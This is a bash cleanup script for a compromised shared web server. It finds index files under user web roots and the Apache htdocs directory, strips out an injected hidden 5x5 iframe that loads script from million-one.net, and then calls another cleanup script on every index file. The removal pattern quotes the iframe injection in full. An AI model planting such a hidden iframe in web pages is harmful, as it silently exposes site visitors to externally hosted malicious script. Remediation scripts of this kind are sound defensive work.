#!/bin/bash

# This is the entire cleanup process.

# First, we want to cleanup any iframes that are there. This could take a while on large servers.

echo "Cleaning up iframes.";

echo "This could take a while.";

for i in `find /home/*/public_html -type f -name index.* -print0 | xargs -0 -I xxx grep -Hr million-one.net xxx | cut -d: -f1`;
do
    echo "$i";
    sed -i 's/<iframe\ name="StatPage"\ src="http:\/\/million-one\.net\/script.php"\ width=5\ height=5\ style="display:none"><\/iframe>//g' "$i";
done;

for i in `grep -Hr million-one.net /usr/local/apache/htdocs | cut -d: -f1`;
do
    echo "$i";
    sed -i 's/<iframe\ name="StatPage"\ src="http:\/\/million-one\.net\/script.php"\ width=5\ height=5\ style="display:none"><\/iframe>//g' "$i";
done;

echo "Finished cleaning up.";

echo "Executing index cleanup. This could also take a while.";

find /home -name index.* -print0 | xargs -0 -I xxx ./cleanup.sh xxx

echo "Finished deleting erroneous files.";

echo "This server is now clean. Please move on to the next. Thank you.";
